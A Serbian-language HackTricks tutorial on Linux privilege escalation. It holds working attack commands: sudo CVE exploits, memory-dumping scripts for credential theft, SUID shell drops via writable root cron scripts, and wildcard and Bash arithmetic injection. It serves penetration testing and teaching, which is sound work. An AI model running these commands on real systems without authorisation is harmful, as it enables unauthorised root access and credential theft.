# Eskalacija privilegija na Linux-u

{{#include ../../../banners/hacktricks-training.md}}

Za širi kontekst i istorijske tokove enumeracije, uporedite resurse g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation i linux-private navedene u referencama.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informacije o sistemu

### Informacije o OS-u

Počnimo tako što ćemo prikupiti osnovne informacije o operativnom sistemu koji je pokrenut.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Putanja

Ako imate **dozvole za pisanje u bilo kojoj fascikli unutar promenljive `PATH`**, možda ćete moći da preuzmete kontrolu nad nekim bibliotekama ili binarnim datotekama:

```bash
echo $PATH
```

### Informacije o okruženju

Zanimljive informacije, lozinke ili API ključevi u promenljivama okruženja?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Proverite verziju kernela i da li postoji exploit koji se može iskoristiti za eskalaciju privilegija.

[Odeljak Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) sadrži slučajeve lokalne eskalacije i linkove ka detaljnijim tekstovima o Linux kernelu u odeljku Binary Exploitation. Pre testiranja slučaja proverite da li su build i konfiguracija pogođeni.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Možete pronaći dobru listu ranjivih kernela i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Druge stranice na kojima možete pronaći **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste sa tog sajta izdvojili sve ranjive verzije kernela, možete da uradite sledeće:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Alati koji mogu pomoći u traženju kernel exploita su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (pokrenite NA žrtvi; proverava samo exploite za kernel 2.x)

Uvek **pretražite verziju kernela na Google-u**; možda je vaša verzija kernela navedena u nekom kernel exploitu, pa ćete biti sigurni da je taj exploit validan.

Dodatne tehnike za eksploataciju kernela:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacija privilegija u Linuxu - Linux kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo verzija

Na osnovu ranjivih verzija sudo koje se pojavljuju u:

```bash
searchsploit sudo
```

Možete proveriti da li je verzija sudo-a ranjiva pomoću ovog grep-a.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Uzvodni sudo **1.9.14 do 1.9.17** omogućava neprivilegovanim lokalnim korisnicima da dobiju root privilegije putem opcije `--chroot` kada sudo učitava `/etc/nsswitch.conf` iz direktorijuma kojim upravlja korisnik; uzvodno je ovo ispravljeno u verziji **1.9.17p1**. Proverite svaki root-setuid sudo binarni fajl u relevantnim putanjama, jer `sudo -V` prikazuje samo binarni fajl koji je izabran pomoću `PATH`. Distribucioni paketi mogu uključiti ispravku bez promene uzvodnog niza verzije, pa proverite i status paketa kod dobavljača. Pogledajte [savetodavno obaveštenje održavaoca sudo-a](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Ovde je [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) za iskorišćavanje te [ranjivosti](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja exploita proverite da li je vaša verzija `sudo` ranjiva i da li podržava funkciju `chroot`.

Više informacija potražite u originalnom [savetodavnom obaveštenju o ranjivosti](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Zaobilaženje sudoers pravila zasnovanih na hostu (CVE-2025-32462)

Uzvodni sudo **1.8.8 do 1.9.17** može da procenjuje sudoers pravila zasnovana na hostu koristeći **ime hosta koje je zadao korisnik** putem `sudo -h <host>`, umesto **stvarnog imena hosta**; uzvodno je ovo ispravljeno u verziji **1.9.17p1**. Korisnik i dalje mora da ima odgovarajući sudoers unos na izabranom hostu. Proverite ispravke koje je dobavljač uneo u pakete i alternativne sudo binarne fajlove, kao i lokalnu politiku. Pogledajte [savetodavno obaveštenje održavaoca sudo-a](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Zahtevi:
- Ranjiva verzija sudo-a
- sudoers pravila specifična za host (host nije ni trenutno ime hosta ni `ALL`)

Primer sudoers obrasca:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit spoofingom dozvoljenog hosta:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Ako se razrešavanje izabranog imena blokira, proverite kako se to ime razrešava na hostu. To što se ime pojavljuje u logu ili konfiguracionoj datoteci ne znači da može da se razreši, a za izmenu datoteke `/etc/hosts` obično je potreban privilegovan pristup za upis.

#### sudo < v1.8.28

Ovaj [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) zahteva efektivno sudo pravilo koje dozvoljava izvršavanje komande kao bilo koji korisnik osim root-a, na primer `(ALL, !root) /bin/bash`. Pozivalac takođe mora imati pravo da koristi to pravilo, uključujući sve zahteve za autentifikaciju. Proverite bezbednosno obaveštenje za instalirani paket: dobavljači su preneli ispravku u izdanja čija je prikazana upstream verzija i dalje niža od 1.8.28. Samo pravilo `!root` ili stara verzija ne potvrđuju da je sistem ranjiv. Tokom pasivne enumeracije nemojte testirati privilegovanu komandu.

```
sudo -u#-1 /bin/bash
```

### Dmesg verifikacija potpisa nije uspela

Proverite **HTB mašinu smasher2** za **primer** kako bi ova ranjivost mogla da se iskoristi

```bash
dmesg 2>/dev/null | grep "signature"
```

### Dodatna enumeracija sistema

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Nabrojite moguće odbrane

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Ako se nalazite unutar kontejnera, počnite od sledećeg odeljka o bezbednosti kontejnera, a zatim pređite na stranice o zloupotrebama specifičnim za runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Diskovi

Proverite **šta je montirano, a šta nije**, gde i zašto. Ako nešto nije montirano, možete pokušati da ga montirate i proverite da li sadrži privatne informacije.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Korisni softver

Nabrojte korisne binarne datoteke

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Takođe, proverite da li je instaliran neki kompajler. Ovo je korisno ako treba da upotrebite neki kernel exploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na nekoj sličnoj).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Instalirani ranjivi softver

Proverite **verzije instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagiosa (na primer) koja bi mogla da se iskoristi za eskalaciju privilegija…\
Preporučuje se da ručno proverite verzije sumnjivijeg instaliranog softvera.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Ako imate SSH pristup mašini, možete koristiti i **openVAS** da proverite da li su na mašini instalirani zastareli i ranjivi softveri.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će uglavnom biti beskorisne, zato se preporučuju aplikacije poput OpenVAS-a ili slične, koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploit-e_

## Processes

Pogledajte **koji se procesi** izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda se Tomcat izvršava kao root?)

```bash
ps aux
ps -ef
top -n 1
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md); možete ih zloupotrebiti za eskalaciju privilegija. **Linpeas** ih detektuje proverom parametra `--inspect` u komandnoj liniji procesa.\
Takođe **proverite svoja ovlašćenja nad binarnim fajlovima procesa** — možda možete da prepišete nečiji fajl.

### Lanci roditeljskih i podređenih procesa između korisnika

Podređeni proces koji se izvršava pod **drugim korisnikom** od svog roditeljskog procesa nije automatski zlonameran, ali predstavlja koristan **signal za trijažu**. Neki prelazi su očekivani (`root` pokreće servisnog korisnika, menadžeri prijavljivanja kreiraju procese sesije), ali neuobičajeni lanci mogu otkriti omotače, pomoćne procese za debagovanje, postojanost ili slabe granice poverenja u vreme izvršavanja.

Brzi pregled:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Ako pronađete iznenađujući lanac, pregledajte komandnu liniju nadređenog procesa i sve datoteke koje utiču na njegovo ponašanje (`config`, `EnvironmentFile`, pomoćne skripte, radni direktorijum, argumente u koje je moguće upisivati). U nekoliko stvarnih putanja za eskalaciju privilegija, sam podređeni proces nije bio moguće menjati, ali jeste **konfiguracija kojom upravlja nadređeni proces** ili lanac pomoćnih skripti.

### Obrisani izvršni fajlovi i otvorene obrisane datoteke

Artefakti tokom izvršavanja često su i dalje dostupni **nakon brisanja**. Ovo je korisno i za eskalaciju privilegija i za oporavak dokaza iz procesa koji već ima otvorene osetljive datoteke.

Proverite obrisane izvršne fajlove:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Ako `/proc/<PID>/exe` pokazuje na `(deleted)`, proces i dalje pokreće staru binarnu sliku iz memorije. To je snažan signal da treba sprovesti istragu, jer:

- uklonjiva izvršna datoteka može sadržati zanimljive stringove ili akreditive
- pokrenuti proces možda i dalje izlaže korisne deskriptore datoteka
- obrisana privilegovana binarna datoteka može ukazivati na nedavno neovlašćeno menjanje ili pokušaj uklanjanja tragova

Prikupite globalno otvorene obrisane datoteke:

```bash
lsof +L1
```

Ako pronađete zanimljiv deskriptor, pribavite ga direktno:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Ovo je naročito korisno kada proces i dalje ima otvorenu obrisanu tajnu, skriptu, izvoz baze podataka ili flag datoteku.

### Nadzor procesa

Možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za nadzor procesa. Ovo može biti veoma korisno za otkrivanje ranjivih procesa koji se često izvršavaju ili kada se ispuni određeni skup uslova.

#### Linux ProcMon uz sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) može da prati odabrane procese i sistemske pozive i da sačuva SQLite trag. Ako `sudo -l` dozvoljava neograničenu root-capable komandu `procmon`, razmotrite da li bi mogla da nadgleda ulazne ili izlazne podatke procesa drugog korisnika. Ova dozvola je samo smernica za proveru: podrška za praćenje, efektivna pravila i aktivnost odgovarajućeg procesa takođe su važni. Datoteke sa tragovima mogu sadržati tajne, zato pažljivo pregledajte odobrene izvoze i izbegavajte prikupljanje podataka o nepovezanim procesima.

### Memorija procesa

Neke serverske usluge čuvaju **akreditive u otvorenom tekstu u memoriji**.\
Obično će vam biti potrebne **root privilegije** da biste čitali memoriju procesa koji pripadaju drugim korisnicima, pa je ovo uglavnom korisnije kada već imate root pristup i želite da otkrijete dodatne akreditive.\
Međutim, imajte na umu da **kao običan korisnik možete čitati memoriju procesa čiji ste vlasnik**.

> [!WARNING]
> Imajte na umu da danas većina mašina **podrazumevano ne dozvoljava ptrace**, što znači da ne možete dumpovati druge procese koji pripadaju vašem neprivilegovanom korisniku.
>
> Datoteka _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše dostupnost ptrace-a:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu da se debaguju, pod uslovom da imaju isti uid. Ovo je klasičan način rada ptrace-a.
> - **kernel.yama.ptrace_scope = 1**: može da se debaguje samo roditeljski proces.
> - **kernel.yama.ptrace_scope = 2**: samo administrator može da koristi ptrace, jer je potrebna CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: nijedan proces ne može da se prati pomoću ptrace-a. Kada se ova vrednost postavi, potrebno je ponovo pokrenuti sistem da bi se ptrace ponovo omogućio.

Proces sa istim UID-om koji nakratko otključa trezor lozinki može predstavljati zasebnu granicu zaštite akreditiva. Kada je praćenje dozvoljeno, aktivan proces koji može da se dumpuje može da otkrije lozinku trezora putem ulaznih sistemskih poziva ili memorije, iako sama šifrovana datoteka trezora ostaje zaštićena. `ptrace_scope=0` je samo jedan od preduslova: važni su i podudarni akreditivi, mogućnost dumpovanja ciljnog procesa, drugi Linux security moduli i trajanje procesa. Za korišćenje unosa iz trezora za Unix root prijavu potrebna je posebna provera ponovne upotrebe akreditiva. Rutinsko nabrajanje treba da prijavi pravila i kandidatski proces ili putanje do trezora, a ne da beleži ulazne podatke ili prikazuje tajne. Pogledajte [Yama dokumentaciju kernela](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) i [provere pristupa ptrace-u](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Ako imate pristup memoriji FTP usluge (na primer), mogli biste da preuzmete Heap i pretražite akreditive u njemu.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB skripta

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps prikazuje kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; prikazuje i **dozvole za svaki mapirani region**. Pseudo-fajl **mem izlaže samu memoriju procesa**. Iz fajla **maps** saznajemo koji su **memorijski regioni čitljivi** i koji su njihovi pomeraji. Te informacije koristimo da **pozicioniramo čitanje u fajlu mem i izbacimo sve čitljive regione** u fajl.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` omogućava pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelnom adresnom prostoru kernela može se pristupiti pomoću /dev/kmem.\
Obično, `/dev/mem` mogu da čitaju samo **root** i grupa **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump za Linux

ProcDump je Linux verzija klasičnog alata ProcDump iz paketa alata Sysinternals za Windows. Preuzmite ga sa [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Alati

Za dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - _Možete ručno ukloniti zahtev za root privilegijama i dumpovati proces koji je u vašem vlasništvu
- Skripta A.5 sa [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (potreban je root)

### Akreditivi iz memorije procesa

#### Ručni primer

Ako ustanovite da je authenticator proces pokrenut:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Možete da dumpujete proces (pogledajte prethodne odeljke da biste pronašli različite načine za dumpovanje memorije procesa) i potražite akreditive u memoriji:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti akreditive u čistom tekstu iz memorije** i iz nekih **poznatih datoteka**. Za ispravan rad potrebne su mu root privilegije.

| Funkcija                                          | Naziv procesa        |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP veze)                         | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)          | apache2              |
| OpenSSH (aktivne SSH sesije – korišćenje Sudo-a)  | sshd:                |

#### Regex izrazi za pretragu/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zakazani/Cron poslovi

### Crontab UI (alseambusher) pokrenut kao root – web-bazirani planer za privesc

Ako web panel „Crontab UI” (alseambusher/crontab-ui) radi kao root i vezan je samo za loopback, i dalje mu možete pristupiti prosleđivanjem lokalnog porta preko SSH-a i kreirati privilegovani posao radi eskalacije.<sup>[[1]](#references)[[4]](#references)</sup>

Tipičan lanac
- Otkrijte port dostupan samo preko loopback-a (npr. 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađite kredencijale u operativnim artefaktima:
  - Rezervne kopije/skripte sa `zip -P <password>`
  - systemd jedinica koja izlaže `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Napravite tunel i prijavite se:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreirajte zadatak sa visokim privilegijama i odmah ga pokrenite (ostavlja SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristite ga:
```bash
/tmp/rootshell -p   # root shell
```

Ojačavanje bezbednosti
- Nemojte pokretati Crontab UI kao root; ograničite ga namenskim korisnikom i minimalnim dozvolama
- Vežite ga za localhost i dodatno ograničite pristup pomoću firewall-a/VPN-a; nemojte ponovo koristiti lozinke
- Izbegavajte ugrađivanje tajni u unit datoteke; koristite skladišta tajni ili EnvironmentFile dostupan samo root-u
- Omogućite audit/logovanje za pokretanje poslova na zahtev

Proverite da li je neki zakazani posao ranjiv. Možda možete da iskoristite skriptu koju izvršava root (wildcard vuln? Možete li da izmenite datoteke koje root koristi? Da koristite symlinks? Da napravite određene datoteke u direktorijumu koji root koristi?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Ako se koristi `run-parts`, proverite koja imena će se zaista izvršiti:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Ovo izbegava lažno pozitivne rezultate. Direktorijum za periodično izvršavanje sa dozvolom za pisanje koristan je samo ako naziv vaše payload datoteke odgovara lokalnim pravilima za `run-parts`.

### Cron putanja

Na primer, u _/etc/crontab_ možete pronaći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Imajte na umu da korisnik „user“ ima dozvole za pisanje u /home/user_)

Ako root korisnik u ovom crontab-u pokuša da izvrši neku komandu ili skriptu bez podešavanja putanje. Na primer: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron koji koristi skriptu sa wildcard znakom (Wildcard Injection)

Ako root izvršava skriptu koja unutar komande sadrži „**\***“, možete to da iskoristite da izazovete neočekivane stvari (kao što je privesc). Primer:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Ako ispred wildcard-a stoji putanja poput** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **).**

Pročitajte sledeću stranicu za još trikova za iskorišćavanje wildcard-a:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injekcija u Bash aritmetičkoj ekspanziji u cron parserima logova

Bash aritmetika može da protumači nepouzdan tekst kao izraz. U određenim Bash kontekstima, indeks niza unutar tog izraza može da izvrši zamenu naredbe. Ako privilegovani cron/parser ubaci tekst iz loga koji kontroliše napadač u takvo aritmetičko poređenje, zamena može da se izvrši sa identitetom parsera.<sup>[[22]](#references)</sup> Ovo zavisi od konkretnog Bash izraza i verzije; samostalni string `$(...)0` u proširenoj promenljivoj nije pouzdan primer ponovne evaluacije.

Ulaz može poticati i iz metapodataka datoteke ili drugog polja pročitanog sa lokacije na koju korisnik može da upisuje. Na primer, privilegovana skripta za čišćenje koja čita oznaku `Producer` slike i poredi je izrazom `[[ "$producer" -eq "expected" ]]` izvršava aritmetičko poređenje, iako je promenljiva pod navodnicima. Utvrdite identitet zakazanog procesa, koje datoteke mogu da obezbede tu oznaku, sve transformacije pre poređenja i tačno ponašanje Bash-a. Za tekstualne oznake koristite poređenje stringova; za brojeve proverite da se ulaz sastoji samo od decimalnih cifara pre aritmetičke obrade. Pogledajte [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Uobičajeni ranjivi obrazac:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Bezbedna lokalna provera ponašanja mehanizma indeksiranja niza (bez privilegovanog procesa ili izmene datoteke):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Pratite stvarnu zakazanu skriptu i doslovnu putanju ulaza koju otvara. Čak i kada sama log datoteka nije upisiva, korisnik koji može da upisuje u njen roditeljski direktorijum bez sticky bita i da mu pristupi može da zameni njen unos u direktorijumu; `namei -l` pomaže da se razlikuju te dozvole. Druga upisiva putanja do loga, nečitljiv scheduler ili parser koji to polje nikada ne obrađuje kao Bash aritmetiku ne potvrđuju ovaj put.

### Prepisivanje cron skripte i symlink

Ako **možete da izmenite cron skriptu** koju izvršava root, veoma lako možete da dobijete shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Ako skripta koju izvršava root koristi **direktorijum kojem imate pun pristup**, možda bi bilo korisno da obrišete taj direktorijum i **napravite simboličku vezu ka drugom direktorijumu** koji sadrži skriptu pod vašom kontrolom.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Provera symlink-ova i bezbednije rukovanje datotekama

Kada pregledate privilegovane skripte/binarne datoteke koje čitaju ili upisuju datoteke koristeći putanju, proverite kako se obrađuju veze:

- `stat()` prati symlink i vraća metapodatke cilja.
- `lstat()` vraća metapodatke same veze.
- `readlink -f` i `namei -l` pomažu da se razreši konačni cilj i prikažu dozvole svake komponente putanje.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Za odbrambene stručnjake/programere, bezbedniji obrasci za zaštitu od symlink trikova uključuju:

- `O_EXCL` sa `O_CREAT`: prekida rad ako putanja već postoji (blokira unapred kreirane linkove/datoteke napadača).
- `openat()`: radi relativno u odnosu na pouzdani file descriptor direktorijuma.
- `mkstemp()`: atomarno kreira privremene datoteke sa bezbednim dozvolama.

### Cron binarne datoteke sa prilagođenim potpisom i payload-ovima koji se mogu menjati
Običan korisnik koji može da menja tačno onu binarnu datoteku koju pokreće root cron job može da pređe granicu privilegija, ali provera prilagođenog potpisa može da odbije nepotpisanu zamenu. U dokumentovanom slučaju, ELF u vlasništvu root-a imao je režim `0760`, koji je članu njegove grupe omogućavao da ga menja, dok je vlasnik root mogao da ga izvršava. Vidljiv trag procesa pokazao je da je `objcopy` izvlačio `.text_sig` pre nego što je job pokrenuo binarnu datoteku; kompletna skripta za proveru nije bila čitljiva.<sup>[[2]](#references)</sup>

Uspešna zamena bila je potpisana leaked privatnim materijalom za potpisivanje pomoću ELF signer-a. Njegova [dokumentacija formata](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) opisuje odeljak potpisa izveden iz `.text` izvršne datoteke. Nije pokazano da je samo dodavanje sertifikata ili odgovarajućeg stringa u `.text_sig` dovoljno da prođe nevidljivu proveru. Pre nego što zaključite da je binarna datoteka sa mogućnošću izmene eksploatabilna, proverite stvarnu zakazanu putanju, efektivni pristup za pisanje, root poziv i pravila provere. Sam odeljak `.text_sig` samo je smernica za pregled.

### Česti cron job-ovi

Možete da nadgledate procese i tražite one koji se izvršavaju svakih 1, 2 ili 5 minuta. Možda možete to da iskoristite za eskalaciju privilegija.

Na primer, da biste **nadgledali svaki 0.1s tokom 1 minuta**, **sortirali prema komandama koje su se najmanje izvršavale** i izbrisali komande koje su se najviše puta izvršavale, možete da uradite sledeće:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Možete koristiti i** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (nadgledaće i izlistati svaki pokrenuti proces).

### Root rezervne kopije koje čuvaju attacker-set mode bits (pg_basebackup)

Ako cron koji radi kao root pokreće `pg_basebackup` (ili bilo koju rekurzivnu kopiju) nad direktorijumom baze podataka u koji možete da upisujete, možete postaviti **SUID/SGID binary** koji će biti ponovo kopiran kao **root:root**, sa istim mode bits u izlazu rezervne kopije.<sup>[[26]](#references)</sup>

